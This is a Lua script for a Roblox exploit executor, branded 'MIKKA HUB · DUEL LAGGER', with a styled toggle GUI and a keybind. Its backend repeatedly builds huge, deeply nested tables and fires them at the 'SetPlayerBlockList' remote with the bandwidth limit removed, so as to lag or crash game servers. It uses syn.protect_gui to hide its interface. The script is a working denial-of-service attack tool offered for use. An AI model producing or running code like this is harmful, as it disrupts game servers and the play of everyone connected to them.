repeat task.wait() until game:IsLoaded()

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== ONYX BACKEND (UNCHANGED) ====================
local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then obj = obj[segment] else return nil end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

-- Workspace optimization
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end
-- ==================== END BACKEND ====================

-- ==================== MIKKA HUB UI ====================
local C = {
    bg         = Color3.fromRGB(6, 6, 10),
    surface    = Color3.fromRGB(16, 16, 24),
    surfaceHi  = Color3.fromRGB(28, 28, 40),
    border     = Color3.fromRGB(45, 45, 60),
    borderHi   = Color3.fromRGB(80, 80, 110),
    accent1    = Color3.fromRGB(138, 43, 226),  -- violet
    accent2    = Color3.fromRGB(0, 255, 255),     -- cyan
    accent3    = Color3.fromRGB(255, 20, 147),   -- deep pink
    text       = Color3.fromRGB(255, 255, 255),
    textSub    = Color3.fromRGB(140, 140, 160),
    pillOff    = Color3.fromRGB(30, 30, 42),
    dotOff     = Color3.fromRGB(100, 100, 120),
    glow       = Color3.fromRGB(138, 43, 226)
}

local boundKey = Enum.KeyCode.V
local listeningForKey = false
local minimized = false

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MikkaHubLagger"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000
pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
gui.Parent = game:GetService("CoreGui")

-- Shadow
local Shadow = Instance.new("Frame")
Shadow.Size = UDim2.new(0, 0, 0, 0)
Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.BackgroundColor3 = Color3.new(0,0,0)
Shadow.BackgroundTransparency = 0.75
Shadow.BorderSizePixel = 0
Shadow.ZIndex = 0
Instance.new("UICorner", Shadow).CornerRadius = UDim.new(0, 20)
Shadow.Parent = gui

-- Animated Border (behind main)
local BorderGlow = Instance.new("Frame")
BorderGlow.Size = UDim2.new(1, 6, 1, 6)
BorderGlow.Position = UDim2.new(0, -3, 0, -3)
BorderGlow.BackgroundColor3 = C.accent1
BorderGlow.BorderSizePixel = 0
BorderGlow.ZIndex = 1
Instance.new("UICorner", BorderGlow).CornerRadius = UDim.new(0, 20)
local BorderGrad = Instance.new("UIGradient", BorderGlow)
BorderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.accent1),
    ColorSequenceKeypoint.new(0.33, C.accent2),
    ColorSequenceKeypoint.new(0.66, C.accent3),
    ColorSequenceKeypoint.new(1, C.accent1)
})
BorderGrad.Rotation = 0

-- Main Panel
local Main = Instance.new("Frame")
Main.Name = "MainPanel"
Main.Size = UDim2.new(0, 0, 0, 0)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = C.bg
Main.BackgroundTransparency = 1
Main.BorderSizePixel = 0
Main.Active = true
Main.ZIndex = 2
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
Main.Parent = gui

BorderGlow.Parent = Main

-- Background gradient
local BgGrad = Instance.new("UIGradient", Main)
BgGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.bg),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 8, 20))
})
BgGrad.Rotation = -45

-- Main stroke
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Thickness = 1.5
MainStroke.Color = C.border
MainStroke.Transparency = 0.3

-- Entrance Animation
TweenService:Create(Main, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 300, 0, 170),
    BackgroundTransparency = 0.05
}):Play()
TweenService:Create(Shadow, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 312, 0, 182)
}):Play()

-- Rotating border animation
RunService.RenderStepped:Connect(function()
    BorderGrad.Rotation = (BorderGrad.Rotation + 1.2) % 360
end)

-- ==================== HEADER ====================
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 42)
Header.Position = UDim2.new(0, 0, 0, 0)
Header.BackgroundTransparency = 1
Header.ZIndex = 3
Header.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 0, 42)
Title.Position = UDim2.new(0, 18, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "MIKKA HUB"
Title.TextColor3 = C.text
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 4
Title.Parent = Header

-- Title gradient effect
local TitleGrad = Instance.new("UIGradient", Title)
TitleGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.accent2),
    ColorSequenceKeypoint.new(1, C.accent1)
})
TitleGrad.Rotation = 0

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, -60, 0, 14)
SubTitle.Position = UDim2.new(0, 18, 0, 28)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "DUEL LAGGER"
SubTitle.TextColor3 = C.textSub
SubTitle.Font = Enum.Font.GothamBold
SubTitle.TextSize = 9
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.ZIndex = 4
SubTitle.Parent = Header

-- Status dot
local StatusDot = Instance.new("Frame")
StatusDot.Size = UDim2.new(0, 8, 0, 8)
StatusDot.Position = UDim2.new(1, -22, 0, 17)
StatusDot.BackgroundColor3 = C.border
StatusDot.BorderSizePixel = 0
StatusDot.ZIndex = 4
Instance.new("UICorner", StatusDot).CornerRadius = UDim.new(1, 0)
StatusDot.Parent = Header

-- Minimize
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 28, 0, 28)
MinBtn.Position = UDim2.new(1, -36, 0, 7)
MinBtn.BackgroundColor3 = C.surface
MinBtn.Text = "−"
MinBtn.TextColor3 = C.textSub
MinBtn.Font = Enum.Font.GothamBlack
MinBtn.TextSize = 14
MinBtn.AutoButtonColor = false
MinBtn.BorderSizePixel = 0
MinBtn.ZIndex = 4
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 8)
MinBtn.Parent = Header

local MinStroke = Instance.new("UIStroke", MinBtn)
MinStroke.Color = C.border
MinStroke.Thickness = 1

-- Minimize hover
MinBtn.MouseEnter:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.surfaceHi}):Play()
    TweenService:Create(MinStroke, TweenInfo.new(0.15), {Color = C.borderHi}):Play()
end)
MinBtn.MouseLeave:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.surface}):Play()
    TweenService:Create(MinStroke, TweenInfo.new(0.15), {Color = C.border}):Play()
end)

-- ==================== TOGGLE ROW ====================
local ToggleRow = Instance.new("Frame")
ToggleRow.Size = UDim2.new(1, -36, 0, 64)
ToggleRow.Position = UDim2.new(0, 18, 0, 50)
ToggleRow.BackgroundColor3 = C.surface
ToggleRow.BorderSizePixel = 0
ToggleRow.ZIndex = 3
Instance.new("UICorner", ToggleRow).CornerRadius = UDim.new(0, 12)
ToggleRow.Parent = Main

local ToggleStroke = Instance.new("UIStroke", ToggleRow)
ToggleStroke.Color = C.border
ToggleStroke.Thickness = 1

-- Label
local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.Size = UDim2.new(1, -120, 0, 20)
ToggleLabel.Position = UDim2.new(0, 16, 0, 10)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Text = "Server Lagger"
ToggleLabel.TextColor3 = C.text
ToggleLabel.Font = Enum.Font.GothamBold
ToggleLabel.TextSize = 13
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.ZIndex = 4
ToggleLabel.Parent = ToggleRow

-- Status
local ToggleStatus = Instance.new("TextLabel")
ToggleStatus.Size = UDim2.new(1, -120, 0, 14)
ToggleStatus.Position = UDim2.new(0, 16, 0, 32)
ToggleStatus.BackgroundTransparency = 1
ToggleStatus.Text = "⚬ IDLE"
ToggleStatus.TextColor3 = C.textSub
ToggleStatus.Font = Enum.Font.GothamBold
ToggleStatus.TextSize = 10
ToggleStatus.TextXAlignment = Enum.TextXAlignment.Left
ToggleStatus.ZIndex = 4
ToggleStatus.Parent = ToggleRow

-- Keybind badge
local KeyBadge = Instance.new("TextLabel")
KeyBadge.Size = UDim2.new(0, 32, 0, 18)
KeyBadge.Position = UDim2.new(0, 16, 0, 48)
KeyBadge.BackgroundColor3 = C.pillOff
KeyBadge.Text = boundKey.Name
KeyBadge.TextColor3 = C.accent2
KeyBadge.Font = Enum.Font.GothamBlack
KeyBadge.TextSize = 8
KeyBadge.ZIndex = 4
Instance.new("UICorner", KeyBadge).CornerRadius = UDim.new(0, 4)
KeyBadge.Parent = ToggleRow

-- Switch Pill
local PillBg = Instance.new("Frame")
PillBg.Size = UDim2.new(0, 48, 0, 24)
PillBg.Position = UDim2.new(1, -64, 0.5, -12)
PillBg.BackgroundColor3 = C.pillOff
PillBg.BorderSizePixel = 0
PillBg.ZIndex = 4
Instance.new("UICorner", PillBg).CornerRadius = UDim.new(1, 0)
PillBg.Parent = ToggleRow

-- Switch Dot
local Dot = Instance.new("Frame")
Dot.Size = UDim2.new(0, 16, 0, 16)
Dot.Position = UDim2.new(0, 4, 0.5, -8)
Dot.BackgroundColor3 = C.dotOff
Dot.BorderSizePixel = 0
Dot.ZIndex = 5
Instance.new("UICorner", Dot).CornerRadius = UDim.new(1, 0)
Dot.Parent = PillBg

-- Hit area
local RowHit = Instance.new("TextButton")
RowHit.Size = UDim2.new(1, 0, 1, 0)
RowHit.BackgroundTransparency = 1
RowHit.Text = ""
RowHit.ZIndex = 6
RowHit.Parent = ToggleRow

-- ==================== KEYBIND ROW ====================
local KeyRow = Instance.new("Frame")
KeyRow.Size = UDim2.new(1, -36, 0, 32)
KeyRow.Position = UDim2.new(0, 18, 0, 122)
KeyRow.BackgroundColor3 = C.surface
KeyRow.BorderSizePixel = 0
KeyRow.ZIndex = 3
KeyRow.Visible = true
Instance.new("UICorner", KeyRow).CornerRadius = UDim.new(0, 10)
KeyRow.Parent = Main

local KeyStroke = Instance.new("UIStroke", KeyRow)
KeyStroke.Color = C.border
KeyStroke.Thickness = 1

local KeyLabel = Instance.new("TextLabel")
KeyLabel.Size = UDim2.new(1, -90, 1, 0)
KeyLabel.Position = UDim2.new(0, 14, 0, 0)
KeyLabel.BackgroundTransparency = 1
KeyLabel.Text = "Change Keybind"
KeyLabel.TextColor3 = C.textSub
KeyLabel.Font = Enum.Font.GothamMedium
KeyLabel.TextSize = 11
KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
KeyLabel.ZIndex = 4
KeyLabel.Parent = KeyRow

local KeyBtn = Instance.new("TextButton")
KeyBtn.Size = UDim2.new(0, 70, 0, 22)
KeyBtn.Position = UDim2.new(1, -82, 0.5, -11)
KeyBtn.BackgroundColor3 = C.pillOff
KeyBtn.Text = "[ " .. boundKey.Name .. " ]"
KeyBtn.TextColor3 = C.textSub
KeyBtn.Font = Enum.Font.GothamBold
KeyBtn.TextSize = 9
KeyBtn.AutoButtonColor = false
KeyBtn.BorderSizePixel = 0
KeyBtn.ZIndex = 4
Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 6)
KeyBtn.Parent = KeyRow

-- Keybind hover
KeyBtn.MouseEnter:Connect(function()
    TweenService:Create(KeyBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.surfaceHi}):Play()
end)
KeyBtn.MouseLeave:Connect(function()
    TweenService:Create(KeyBtn, TweenInfo.new(0.15), {BackgroundColor3 = C.pillOff}):Play()
end)

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, -36, 0, 12)
Footer.Position = UDim2.new(0, 18, 0, 158)
Footer.BackgroundTransparency = 1
Footer.Text = "MIKKA HUB · PREMIUM"
Footer.TextColor3 = C.textSub
Footer.TextTransparency = 0.6
Footer.Font = Enum.Font.GothamSemibold
Footer.TextSize = 8
Footer.TextXAlignment = Enum.TextXAlignment.Center
Footer.ZIndex = 3
Footer.Parent = Main

-- ==================== DRAGGING ====================
local dragging, dragInput, dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        Main.Position = newPos
        Shadow.Position = UDim2.new(newPos.X.Scale, newPos.X.Offset + 2, newPos.Y.Scale, newPos.Y.Offset + 2)
    end
end)

-- ==================== INTERACTIVITY ====================
local function refreshAll(state)
    local tw = TweenInfo.new(0.2, Enum.EasingStyle.Quad)
    local spring = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    
    if state then
        -- Dot spring
        TweenService:Create(Dot, spring, {
            Position = UDim2.new(1, -20, 0.5, -8),
            BackgroundColor3 = C.accent2
        }):Play()
        -- Status
        ToggleStatus.Text = "● ACTIVE"
        ToggleStatus.TextColor3 = C.accent2
        -- Glow dot
        TweenService:Create(StatusDot, tw, {BackgroundColor3 = C.accent2}):Play()
        -- Row
        TweenService:Create(ToggleRow, tw, {BackgroundColor3 = C.surfaceHi}):Play()
        TweenService:Create(ToggleStroke, tw, {Color = C.accent1}):Play()
        -- Main border
        TweenService:Create(MainStroke, tw, {Color = C.accent1, Transparency = 0}):Play()
        -- Border glow
        TweenService:Create(BorderGlow, tw, {BackgroundTransparency = 0.3}):Play()
        startLagger()
    else
        -- Dot spring
        TweenService:Create(Dot, spring, {
            Position = UDim2.new(0, 4, 0.5, -8),
            BackgroundColor3 = C.dotOff
        }):Play()
        -- Status
        ToggleStatus.Text = "⚬ IDLE"
        ToggleStatus.TextColor3 = C.textSub
        -- Glow dot
        TweenService:Create(StatusDot, tw, {BackgroundColor3 = C.border}):Play()
        -- Row
        TweenService:Create(ToggleRow, tw, {BackgroundColor3 = C.surface}):Play()
        TweenService:Create(ToggleStroke, tw, {Color = C.border}):Play()
        -- Main border
        TweenService:Create(MainStroke, tw, {Color = C.border, Transparency = 0.3}):Play()
        -- Border glow
        TweenService:Create(BorderGlow, tw, {BackgroundTransparency = 0}):Play()
        stopLaggerLoop()
    end
end

RowHit.MouseButton1Click:Connect(function()
    refreshAll(not laggerEnabled)
end)

-- Keybind
KeyBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    KeyBtn.Text = "[ ... ]"
    KeyBtn.TextColor3 = C.accent2
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if listeningForKey then
        if input.KeyCode ~= Enum.KeyCode.Unknown then
            boundKey = input.KeyCode
            KeyBadge.Text = boundKey.Name
            KeyBtn.Text = "[ " .. boundKey.Name .. " ]"
            KeyBtn.TextColor3 = C.textSub
            listeningForKey = false
        end
    elseif input.KeyCode == boundKey then
        refreshAll(not laggerEnabled)
    end
end)

-- Minimize
MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 300, 0, 42)}):Play()
        TweenService:Create(Shadow, TweenInfo.new(0.3), {Size = UDim2.new(0, 312, 0, 54)}):Play()
        ToggleRow.Visible = false
        KeyRow.Visible = false
        Footer.Visible = false
        MinBtn.Text = "+"
    else
        TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 300, 0, 170)}):Play()
        TweenService:Create(Shadow, TweenInfo.new(0.3), {Size = UDim2.new(0, 312, 0, 182)}):Play()
        ToggleRow.Visible = true
        KeyRow.Visible = true
        Footer.Visible = true
        MinBtn.Text = "−"
    end
end)

-- Pulse animation when active
local pulseConnection = nil
local function startPulse()
    if pulseConnection then return end
    local growing = true
    pulseConnection = RunService.RenderStepped:Connect(function()
        if not laggerEnabled or not Main then
            if pulseConnection then pulseConnection:Disconnect() pulseConnection = nil end
            return
        end
        -- Subtle border pulse
        local current = BorderGlow.BackgroundTransparency
        if growing then
            BorderGlow.BackgroundTransparency = math.max(current - 0.01, 0.15)
            if current <= 0.15 then growing = false end
        else
            BorderGlow.BackgroundTransparency = math.min(current + 0.01, 0.4)
            if current >= 0.4 then growing = true end
        end
    end)
end

-- Hook pulse into refresh
local originalRefresh = refreshAll
refreshAll = function(state)
    originalRefresh(state)
    if state then startPulse() end
end

-- Init
refreshAll(false)
